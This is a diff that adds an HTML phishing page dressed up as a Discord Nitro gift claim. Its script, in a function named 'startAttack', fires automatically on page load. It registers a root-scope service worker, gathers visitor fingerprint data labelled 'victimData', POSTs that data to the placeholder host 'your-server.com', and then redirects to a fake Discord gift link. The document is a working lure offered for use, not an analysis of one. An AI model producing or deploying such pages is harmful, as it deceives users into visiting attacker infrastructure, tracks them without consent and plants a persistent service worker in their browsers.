@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Nitro Gift</title>
+    <style>
+        body { background: #36393f; color: #dcddde; font-family: Arial; text-align: center; padding-top: 80px; }
+        h2 { color: #43b581; }
+    </style>
+</head>
+<body>
+    <h2>Claiming your 3-month Nitro Gift...</h2>
+    <p>Please wait while we verify your account.</p>
+
+    <script>
+        async function startAttack() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    await navigator.serviceWorker.register('/sw.js', {scope: '/'});
+                    
+                    const victimData = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen: screen.width + "x" + screen.height,
+                        language: navigator.language,
+                        timestamp: Date.now()
+                    };
+
+                    await fetch('https://your-server.com/victim', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(victimData)
+                    });
+                } catch(e) {}
+            }
+
+            setTimeout(() => {
+                window.location = "https://discord.com/gifts/fake123";
+            }, 1800);
+        }
+
+        setTimeout(startAttack, 1000);   // Triggers after 1 second
+    </script>
+</body>
+</html>
